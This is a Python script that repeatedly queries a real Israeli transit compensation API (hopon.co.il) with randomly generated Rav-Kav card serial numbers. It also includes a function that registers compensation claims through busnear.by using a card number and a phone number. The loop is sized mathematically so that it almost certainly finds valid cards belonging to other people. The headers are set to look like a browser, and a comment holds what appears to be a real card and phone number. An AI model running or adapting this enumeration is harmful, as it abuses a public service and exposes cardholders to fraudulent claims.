import requests
import random
import math

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,he;q=0.8",
    "Connection": "keep-alive",
    "DNT": "1",
    "Host": "api.hopon.co.il",
    "Origin": "https://hopon.co.il",
    "Referer": "https://hopon.co.il/%D7%A4%D7%99%D7%A6%D7%95%D7%99-%D7%A8%D7%91-%D7%A7%D7%95-%D7%A7%D7%95%D7%A8%D7%95%D7%A0%D7%94",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
}

#     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"


URL = "https://api.hopon.co.il/v0.15/2/isr/ravkavCompensationCheck"
PARAMETER = "ravkav_serial_number"


def call(ravkav: str):
    assert 8 <= len(ravkav) <= 10

    resp = requests.get(URL, {PARAMETER: ravkav}, headers=HEADERS)
    return resp


URL2 = "https://busnear.by/register-ravkav-compensation"
# consent: true, ravkav: 102556842, phone: 0546985698

HEADERS2 = {
    #":authority": "busnear.by",
    #":method": "GET",
    #":path": "/register-ravkav-compensation?consent={consent}&ravkav={ravkav}&phone={phone}",
    #":scheme": "https",
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,he;q=0.8",
    "dnt": "1",
    "origin": "https://hopon.co.il",
    "referer": "https://hopon.co.il/%D7%A4%D7%99%D7%A6%D7%95%D7%99-%D7%A8%D7%91-%D7%A7%D7%95-%D7%A7%D7%95%D7%A8%D7%95%D7%A0%D7%94",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
}

# user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36


def call2(ravkav: str, phone: str):
    assert 8 <= len(ravkav) <= 10

    #HEADERS2[":path"] = HEADERS2[":path"].replace("{consent}", "true").replace("{ravkav}", ravkav).replace("{phone}", phone)

    resp = requests.get(URL2, {"consent": "true", "ravkav": ravkav, "phone": phone}, headers=HEADERS2)
    return resp


def rnd(ignore=b'{"status":{"errorCode":0,"errorMsg":""},"data":{"status":false}}'):
    ln = random.choice("789")
    n = "".join([random.choice("0123456789") for _ in range(int(ln) + 1)])

    resp = call(n)
    if resp.status_code != 200 or resp.content != ignore:
        return resp
    else:
        print("no", n)


def calc():
    num_ravkavs = 10**8 + 10**9 + 10**10
    num_il_citizens = 9*10**6
    citizens_w_ravkav = .5

    prob_hit = (num_il_citizens * citizens_w_ravkav) / num_ravkavs
    prob_miss = 1 - prob_hit

    acceptable_prob_miss = 0.01
    repeats = math.ceil(math.log10(acceptable_prob_miss)/math.log10(prob_miss))

    return repeats


def go():
    for _ in range(2 * calc()):
        r = rnd()
        if r is not None:
            return r

